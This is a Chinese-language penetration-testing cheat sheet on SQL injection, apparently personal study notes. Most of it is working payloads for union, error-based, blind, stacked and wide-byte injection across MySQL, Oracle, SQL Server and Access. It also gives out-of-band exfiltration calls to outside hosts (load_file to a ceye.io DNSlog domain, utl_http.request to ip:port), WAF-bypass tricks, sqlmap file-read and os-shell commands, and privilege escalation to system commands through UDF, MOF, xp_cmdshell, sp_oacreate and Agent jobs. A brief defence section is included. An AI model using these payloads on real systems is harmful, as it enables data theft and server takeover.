# 渗透重拾篇 · SQL 注入

## 什么是 SQL 注入

应用程序在向后台数据库传递 SQL 查询时，如果为攻击者提供了影响该查询的能力，就会引发 SQL 注入。

## SQL 注入形成的条件

* 用户能控制数据的输入
* 原本要执行的代码，拼接了用户的输入

## SQL 注入的分类

* 注入点类型：数字型、字符型、搜索型
* 注入点位置：GET 注入、POST 注入、Cookie 注入、XFF 注入、HTTP 头注入
* 页面有无回显：内联注入、报错注入、堆叠注入、布尔盲注、延时注入、DNSlog 外带、JSON 注入

## 判断注入漏洞的依据

根据客户端返回的结果来判断提交的测试语句是否成功被数据库引擎执行，如果测试语句被执行了，说明存在注入漏洞。

1. 构造 payload 测试语句
2. 提交请求
3. 分析返回结果
4. 符合预期结果则存在 SQL 注入漏洞

### 一般流程

1. 判断注入点类型
2. 通过排序（order by）判断表的列数
   - 原理是 order by 不仅可以通过字段名来排序，也可以通过字段相应位置的数字排序
3. 通过联合查询（union select）判断回显位置
   - 原理是 union select 查询的结果互不干扰
4. 在回显的位置上替换查询语句
5. 若无回显则通过 length() 猜测数据库名长度
6. 通过 substr() 猜测数据库名的每一个字符

## SQL注 入漏洞挖掘方式

### 内联 SQL 注入

注入一段 SQL 语句后，原来的语句仍会全部执行。
**内联注入常用测试语句（数字型）**

| 测试字符串           | 变种                   | 预期结果                                       |
| -------------------- | ---------------------- | ---------------------------------------------- |
| '                    |                        | 触发错误。如果成功，数据库会返回一个错误       |
| value+0              | value-0                | 成功会返回与原请求相同的结果                   |
| value\*1             | value/1                | 成功会返回与原请求相同的结果                   |
| 1 or 1=1             | 1)or(1=1               | 永真条件。成功会返回表中所有的行               |
| value or 1=2         | value)or(1=2           | 空条件。成功会返回与原请求相同的结果           |
| 1 and 1=2            | 1)and(1=2              | 永假条件。成功不返回表中任何行                 |
| 1 or 'ab'='a'+'b'    | 1)or('ab'=a+'b'        | SQL Server 串联’成功会返回与永真条件相同的信息 |
| 1 or 'ab'='a''b'     | 1)or('ab'='a''b'       | MySQL 串联’成功会返回与永真条件相同的信息      |
| 1 or 'ab'='a'\|\|'b' | 1\)or\('ab'='a'\|\|'b' | Oracle 串联’成功会返回与永真条件相同的信息     |

**其他测试语句**

数字型：

* and 1=1/and 1=2
* or 1=1/or 1=2
* +、-、\*、/、>、<、<=、>=
* 1 link 1/1 link 2
* 1 in(1,2)/1 in(2,3)

字符型：

* and '1'='1/and '1'='2
* or '1'='1/or '1'='2
* +'/+'1、-'0/-'1、>、<、<=、>=
* 1' link '1/1' link '2
* 1' in('1')#/'1' in('2')#

搜索型

- x%' or 1=1#

### 终止式 SQL 注入

攻击者注入一段包含注释符的 SQL 语句，将原来语句的一部分注释，注释掉的部分语句不会被执行。

**SQL Server 和 Oracle**

* \-\- 用于单行注释
* /\* \*/ 用于多行注释

**MySQL**

* \-\- 或\-\-\-或\-\-\+ 用于单行注释
* \# 用于单行注释
* /\* \*/ 用于多行注释

## 常见数据库注入

### Access

#### 注入猜解过程

* 猜解表名 and (select)
* 猜解列名 and (select count(列名) from 表名)>0
* 猜解字段值长度 and (select len(列名) from 表名 where id=6)>10
* ASCII逐字解码法猜解字段值 and (select asc(mid(列名,2,1)) from 表名 where id=6)>96

> 表名和列名只能猜解，需要强大的字典，一般使用工具完成该过程

### MySQL

#### 获取元数据

MySQL5.0及以上版本提供了 information\_schema 库，通过它可以访问数据库元数据。

* `select schema_name from information_schema.schemata limit1`
* `select group_concat(table_name) from information_schema.tables where table_schema=database()`
* `select group_concat(column_name) from information_schema.columns where table_name=0x7573657273`

> schemata 表：所有数据库信息；tables 表：所有表信息；columns 表：所有列信息

#### 连接字符串

* concat()：连接一个或多个字符串
  * 格式：concat(str1,str2,...)
  * 举例：`select concat(user(),0x2c,database());`
* concat\_ws()：第一个参数是其他参数的分隔符
  * 格式：concat\_ws(separator,str1,str2,...)
  * 举例：`select concat_ws(0x2c,user(),database());`
* group\_concat()：连接一个组的所有字符串，并以逗号分隔每一条数据
  * 举例：`select id,group_concat(name) from users;`
  * 解释：把 name 字段的值打印在一行

#### 内联注入

* union
  * 联合的意思，即把多次查询的结果合并起来
  * 自动去除重复的行，若不想去除，可使用 union all
  * 前面的查询语句与后面的查询语句结果互不干扰
* 必备条件
  * 所有查询中必须具有相同的结构，即查询语句的字段数量相同
  * 对应列的数据类型可以不同但必须兼容
  * 如果为XML数据类型则必须等价
* 用法举例
  * select id,name,passwd from users union select 1,2,3;

#### Base64 编码注入

解码、构造语句、编码、$id = base64\_decode($id)

#### 堆叠注入

多条语句一起执行，即在一条 SQL 语句结束符（;）后面还有其他 SQL 语句。

- 利用代码：`id=1;select load_file('/tmp/t');`
- 注意事项：Oracle 不支持

#### 二阶注入

SQL 注入一般可分为一阶注入（普通注入）和二阶注入。

一阶注入发生在一个 HTTP 请求和响应中，系统对攻击输入立刻反应执行，过程归纳如下：

1. 攻击者在 HTTP 请求中提交恶意 SQL 语句
2. 应用处理恶意输入，使用恶意输入动态构造 SQL 语句
3. 如果攻击实现，在响应中向攻击者返回结构

二阶注入，恶意代码注入到 web 应用中不会立刻执行，而是存储到后端数据库中，在处理请求时，应用检索到数据库中的恶意代码并利用它动态构造 SQL 语句，实现攻击。过程归纳如下：

1. 攻击者在 HTTP 请求中提交恶意代码
2. 将恶意代码存入数据库中
3. 攻击者提交第二个 HTTP 请求
4. 为处理第二个 HTTP 请求，应用检索存储在后端数据库中的恶意代码，动态构造 SQL 语句
5. 若攻击实现，在第二个请求的响应中向攻击者返回结构

#### 报错注入

* 通过 extractvalue() 函数报错

  * 利用代码：`Less-2/?id=1 [and|or] extractvalue(1, concat(0x7e,database()))`
  * 注意事项：extractvalue() 函数有两个参数，第一个参数为 1 即可，第二个参数是需要查询的数据

* 通过 updatexml() 函数报错

  * 利用代码：`Less-2/?id=1 [and|or] updatexml(1,concat(0x7e,database()),1)`
  * 注意事项：updatexml() 函数有三个参数，第一个和第三个参数写 1 即可，第二个参数是需要查询的数据

* 通过 floor() 函数报错

  * 利用代码：`Less-2/?id=1 [and|or] (select 1 from (select count(*), concat(database(), floor(rand(0)*2))x from information_schema.tables group by x)y)`

    > rand()：随机数函数，取值范围 0~1；       rand(0)：种子数，固定值
    >
    > floor()：向下取整函数；                             floor(rand(0)*2))：只会出现两种情况，要么 0，要么 1
    >
    > count()：计数函数；                                   count(*)：统计总数
    >
    > group by：分组；                                        x 与 y 都是别名

  * 注意事项

    1. 在 MySQL 8.0 版本已失效

    2. 查询的表内数据至少 3 条

#### 布尔盲注

不管输入什么，结果只返回真或假。关键在于通过表达式结果与已知值进行比对判断正确与否。

1. 先获取长度：`id=1' and length(database())=5`
2. 枚举每一个字符：`id=1' and substr(database(),1,1)='s'`

> length()：返回查询字符串长度；left(str，length)；从左边第一位开始截取指定长度字符串；ord()、ascii()：返回字符的 ASCII 码
>
> substring(str, index, length) 、substr(str, index, length)、mid(str, index, length)：从指定开始位置截取指定长度字符串

#### 延时注入

延时注入通过页面返回的时间来判断，不同的 MySQL 版本延时注入的语法也不同。

MySQL>=5.0 的可以使用 sleep() 进行查询，MySQL<5.0 的可以使用 benchmark() 进行查询。

* benchmark() 的用法
  * benchmark(查询次数, SQL语句)
  * `select benchmark(1000, select * from users);`
* sleep() 的用法
  * `id=1 and sleep(5)` 判断是否存在延时注入
  * `and if(substring(user(),1,4)='root',sleep(5),1)`  判断当前用户是否为 root 用户
  * `and if(mid(version(),1,1) like 5,sleep(5),1)` 判断 MySQL 版本是否为 5 版本
  * `and if(ascii(substring(database(),1,4))>100,sleep(5),1)` 猜解数据库名

#### DNSlog 外带

- 利用代码：`Less-8/?id=1' and load_file(concat('\\\\',hex(user()),'.xxx.ceye.io\\abc'))--+`
- 利用条件：
  1. 只适用于 Windows 平台
  2. secure_file_priv=''

#### JSON 注入

应用程序未对提交的 JSON 数据进行验证、过滤，导致修改了 JSON 数据的语义。

- 利用代码：`json={"name":"admin' and 1=2#"}`

#### 宽字节注入

GB2312、GBK、BIG5、GB18030、Shift\_JIS 等这些都是常说的宽字节，宽字节实际上是两个字节，它带来的安全问题只是吃 ASCII 字符（一字节）的现象

* 原理
  * %df' 被 PHP 转义（开启 GPC、用 addslashes 函数等），单引号被加上反斜杠 \，变成了 %df'，其中\的十六进制是 %5C，导致 %df' 变成了 %df%5c%27，MySQL 会认为它是一个宽字节，有了单引号就可以注入了

* 利用条件
  * 只有 GBK 编码才会生效

#### 文件读写

* load\_file() 函数读文件操作
  * 必备条件：
    * 文件必须在服务器上
    * 关闭魔术引号（magic_quotes_gpc()=OFF）
    * 知道站点物理路径
      * 常见方式：报错显示、遗留文件（phpinfo.php）、配置文件
    * MySQL 用户对文件有读写权限（security_file_priv != NULL）
    * load\_file() 函数操作文件的当前目录是 @@datadir（即数据库存储路径）
    * 文件大小必须小于 max\_allowed\_packet，@@max\_allowed\_packet 的默认大小是16M，最大为1G
  * SQL 语句如下：
    * `union select 1,load_file('文件路径'),3`
    * `union select 1,load_file(HEX格式),3`
    * `union select 1,load_file(char(ASCII码)),3`
* into outfile 写文件操作
  * 必备条件
    * 关闭魔术引号（magic_quotes_gpc()=OFF）
    * 用户有写文件的权限（security_file_priv != NULL）
    * into outfile 不可以覆盖已存在的文件
    * into outfile 必须是最后一个查询
    * 知道站点物理路径
      * 常见方式：报错显示、遗留文件（phpinfo.php）、配置文件
  * SQL语句如下：
    * `select [文本内容|char(ASCII码)] into outfile 文件绝对路径`
    * `select 1 into outfile 文件绝对路径 lines terminated by 16进制内容`

### Oracle

#### 获取元数据

- 获取数据库版本：`select banner from sys.v_$version`
- 获取当前用户名：`select user from dual`
- 获取数据库的实例名（SYS 用户）：`select instance_name from v_$instance`
- 获取表名：`select table_name from user_tables where rownum=1`

> user_tables：提供当前用户拥有的所有表的信息；user_tab_columns：提供当前用户拥有的表和视图中的所有列的信息；
>
> all_tables：提供所有用户定义的表的信息；all_tab_columns：提供所有用户定义的表和视图中所有列的相关信息

#### 内联注入

- 基本规则
  1. 使用查询语句获取数据时，需要跟上表名，没有表的情况下可以使用 dual。dual 是 Oracle 的虚拟表，用来构成 select 的语法规则，Oracle 保证 dual 里面永远只有一条记录。
  2. Oracle 的数据类型是强匹配，所以进行类似 UNION 查询时候必须让对应位置上的数据类型和表中的列的数据一致，也可以用 null 代替某些无法快速猜测出数据类型的位置
- 利用流程
  1. 判断注入点（同 MySQL）
  2. 判断列数（同 MySQL）
  3. 通过 union 进行查询：`union select null, null, null from dual`
  4. 判断每个字段的数据类型：`union select 1, 'str', null from dual`
  5. 获取数据库表名：`union select null, table_name, null from user_tables where rownum=1`

#### 报错注入

- 利用条件
  1. and 关键字不可缺
  2. 需使用类似 1=(报错语句)，1>(报错语句) 的比较运算符
- 利用代码
  - `select ctxsys.drithsx.sn(1, (select user from dual)) from dual`
  - `select ctxsys.ctx_report.token_type((select user from dual), '1') from dual`

#### OBB 外带数据

- 利用条件：支持 utl_http.request
- 利用代理：`and utl_http.request('http://ip:port/'%7c%7c(select user from dual))=1--`

## WAF 绕过

双写、大小写、编码、00截断、内联注释、同义替换、换行、HTTP 参数污染、变更请求方式、web 中间件特性、数据库特性

> - IIS
>   - % 特性：输入 s%elect，WAF 解析的结果可能就是 s%elect，但在 IIS + ASP 下解析出来的是 select
>   - %u 特性：对于 select 中的部分进行 unicode 编码，得到 s%u006c%u0006ect。当 IIS 接收到后会被转换为 select，但WAF 接收到的内容可能还是 s%u006c%u0006ect。
> - Apache
>   - 畸形 method：某些版本在解析不正常请求方式时，会按 Get 方式处理。
>   - 畸形 boundary：PHP 对于 boundary 的识别只取逗号前的内容，WAF 解析的时候，有可能获取整个字符串。

## SQL 注入的防范

* 编码阶段：安全编码规范（输入验证、遵循安全 SQL 编码规范）
* 测试阶段：代码审计、SQL 注入测试等，可手工也可以结合自动工具
* 部署阶段：数据库安全加固、WEB 应用防火墙、IDS/IPS

### 安全编码

1. 输入验证
   1. 数字型的输入必须是合法的数字
   2. 字符型的输入中对 ' 进行特殊处理
   3. 验证所有的输入点，包括 GET，POST，Cookie 以及其他 HTTP 头
2. 使用符合规范的数据库访问语句
   1. 正确使用静态查询语句

### SQL 注入漏洞常见过滤方法

> 以 PHP 为例

* intval、addslashes、mysql\_real\_escape
* mysqli\_escape\_string、mysqli\_real\_escape\_string、mysqli::escape\_string
* PDO::quote
* 参数化查询

## 通过 SQLMap 进行注入

数据库连接

- `sqlmap -d DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/<MySQL/Oracle/MSSQL/PgSQL>`
- `sqlmap -d DBMS://<SQLite, Microsoft Access, Firebird>`

POST 数据

- `sqlmap -u <url> --data="id=1"`

从文件中加载请求

- `sqlmap -r <request_from_awvs>`

设置 Cookie

- `sqlmap -u <url> --cookie <cookie>`

设置随机 UA

- `sqlmap -u <url> --random-agent`

设置代理

- `sqlmap --proxy <proxy> -u <url>`

设置级别

- --level 1 检测 Get 和 Post
- --level 2 检测 Cookie
- --level 3 检测 UA 和 Referer
- --level 4 检测更多
- --level 5 检测 HOST 头

设置风险

- --risk 1 无害注入
- --risk 2 添加大量时间盲注语句
- --risk 3 添加 or 类型的布尔盲注 ，可能会在 update 语句中导致修改数据库

上传/下载

- 上传：`sqlmap -u <url> --file-write <local_file> --file-dest <target_machine_directory>`
- 下载：`sqlmap -u <url> --file-read /etc/passwd`

RCE（--os-shell）

- 使用条件：
  1. 有写入权限
  2. 路径名是默认的
  3. 禁用 magic_quotes_gpc

## MySQL 提权

### UDF

UDF（user define function）用户自定义功能。提权的本质是通过以运行 MySQL 服务的用户身份去执行系统命令，所以只适用于 5.7 以下版本。

前提准备

- 查询版本：`select version();`
  - MySQL < 5.0，路径随意
  - 5.0 <= MySQL < 5.1，放置系统目录（system32）
  - MySQL > 5.1，MySQL 安装目录的 `lib\plugin` 文件夹下（默认不存在，需自建）
- 查询读写权限：`select global variables like secure_file_priv;`
- 查询插件目录：`show variables like 'plugin_dir'; | select @@plugin_dir;`
- 查询 OS 架构：`show variables like '%compile%'; | select @@version_compile_os; | select @@version_compile_machine;`

提权步骤

1. 建表：先创建一张临时表存放 DLL/SO 文件的十六进制内容
   - `create table temp_udf(udf blob);`
2. 插入：`insert into temp_udf values(convert(DLL/SO 的十六进制内容,char));`
3. 导出：使用 dumpfile，因为它会保持原数据格式
   * `select udf from temp_udf into dumpfile "DLL/SO 存放路径";`
4. 创建函数：`create function sys_eval returns string soname "udf.[so|dll]";`
5. 执行函数：`select sys_eval('whoami');`

### MOF(Windows)

MOF 是 Windows 的托管对象格式文件，位于`C:/Windows/system32/wbem/mof`。server 2003 及以下系统每隔几秒会执行一次 mof 目录下的文件，执行成功会移动到 good 文件夹，失败则移动到 bad 文件夹。

前提准备

1. MySQL 以高权限运行
2. MySQL 具有写入 mof 目录权限
3. 只适用于 server 2003 及以下的系统

提权步骤

- 写入文件：`select mof文件十六进制内容 into dumpfile "C:/Windows/system32/wbem/mof/x.mof";`

## SQL server 提权

### xp_cmdshell

xp_cmdshell 可以执行系统命令，在 mssql 2000 是默认开启的，在 mssql 2005 之后默认禁止。管理员 sa 权限可通过 sp_configure 开启。

1. 判断 xp_cmdshell 是否存在，返回 1 则存在：`select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'`
2. 不存在则开启：`EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE`
3. 关闭：`EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE`
4. 执行系统命令：`exec master..xp_cmdshell 'whoami'`

### sp_oacreate + sp_oamethod

在 xp_cmdshell 不能利用的情况下可以考虑 sp_oacreate，利用前提是 sqlserver sysadmin 账户，服务器权限为 system。

sp_oacreate 是一个存储过程，可以删除、复制、移动文件，配合 sp_oamethod 写文件执行系统命令。

1. 判断 sp_oacreate 是否存在，返回 1 则存在：`select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'`

2. 开启：`exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure`

3. 关闭：`exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',0;reconfigure`

4. 执行系统命令：

   ````mssql
   declare @shell int
   exec sp_oacreate 'wscript.shell',@shell output
   exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c whoami'
   ````

5. 直接执行命令成功后无回显的情况

   ```mssql
   declare @shell int, @exec int, @text int, @str varchar(8000)
   exec sp_oacreate 'wscript.shell',@shell output
   exec sp_oamethod @shell,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c whoami'
   exec sp_oamethod @exec, 'StdOut', @text out
   exec sp_oamethod @text, 'readall', @str out
   select @str;
   ```

### 沙盒提权

沙盒模式是数据库的一种安全功能。在沙盒模式下，只对控件和字段属性中的安全且不含恶意代码的表达式求值。

利用前提：

- 具有 dba 权限
- 数据库运行权限为 system
- 服务器拥有 jet.oledb.4.0 驱动

局限：

- Microsoft.jet.oledb.4.0 一般在 32 位操作系统上才可以
- Windows 2008 以上默认无 Access 数据库文件，需要自己上传
- sqlserver 2015 默认禁用 Ad Hoc Distributed Queries，需要开启

### SQL Server Agent  Job

SQL Server Agent 是一项 Microsoft Windows 服务，它执行计划的管理任务，这些任务在 SQL Server 中称为作业。

- 启动 Agent：`exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT'`

- 创建任务 test 并执行命令，将结果写入1.txt

  ```mssql
  use msdb;
  exec sp_delete_job null,'test'
  exec sp_add_job 'test'
  exec sp_add_jobstep null,'test',null,'1','cmdexec','cmd /c "whoami>c:/1.txt"'
  exec sp_add_jobserver null,'test',@@servername
  exec sp_start_job 'test';
  ```

- 命令执行成功后没有回显，可以把1.txt 写到表中，再查询表中内容获取命令回显

  ```mssql
  Use model;
  bulk insert readfile from 'C:\1.txt'
  select * from readfile
  ```

## 番外

### MySQL 权限

#### 权限级别

- 全局性管理权限： 作用于整个 MySQL 实例 
- 数据库级权限： 作用于某个指定的数据库上或者所有的数据库上 
- 数据库对象级权限：作用于指定的数据库对象上（表、视图等）或者所有的数据库对象

#### 系统权限表

- User 表：存放用户账户信息以及全局级别（所有数据库）权限，决定了来自哪些主机的哪些用户可以访问数据库实例。如果有全局权限则意味着对所有数据库都有此权限 
- Db 表：存放数据库级别的权限，决定了来自哪些主机的哪些用户可以访问此数据库 
- Tables_priv 表：存放表级别的权限，决定了来自哪些主机的哪些用户可以访问数据库的这个表 
- Columns_priv 表：存放列级别的权限，决定了来自哪些主机的哪些用户可以访问数据库表的这个字段 
- Procs_priv 表：存放存储过程和函数级别的权限

#### MySQL 权限表的验证流程

1. 从 user 表中的 Host, User, Password 字段中判断连接的 ip、用户名、密码是否存在，存在则通过验证
2. 通过身份认证后，进行权限分配，按照 user，db，tables_priv，columns_priv 的顺序进行验证
3. 检查全局权限表 user，如果 user 中对应的权限为 Y，则此用户对所有数据库的权限都为 Y，将不再检查其他表
4. 若为 N，则到 db 表中检查此用户对应的具体数据库，并得到 db 中为 Y 的权限
5. 若 db 中为 N，则检查 tables_priv 中此数据库对应的具体表，取得表中的权限 Y，以此类推
